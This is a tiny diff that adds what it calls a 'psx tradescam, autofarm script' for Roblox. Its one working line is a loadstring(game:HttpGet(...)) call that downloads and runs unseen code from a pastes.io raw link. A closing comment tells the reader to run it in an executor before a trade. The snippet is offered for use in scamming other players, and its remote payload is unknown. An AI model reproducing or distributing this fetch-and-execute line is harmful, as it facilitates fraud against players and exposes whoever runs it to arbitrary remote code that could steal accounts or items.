@@ -1,0 +1,6 @@
+--// psx tradescam, autofarm script 
+
+script: 
+loadstring(game:HttpGet("https://pastes.io/raw/3gAmi35f7B", true))()
+
+--// run this in your executor before the trade, so it works.
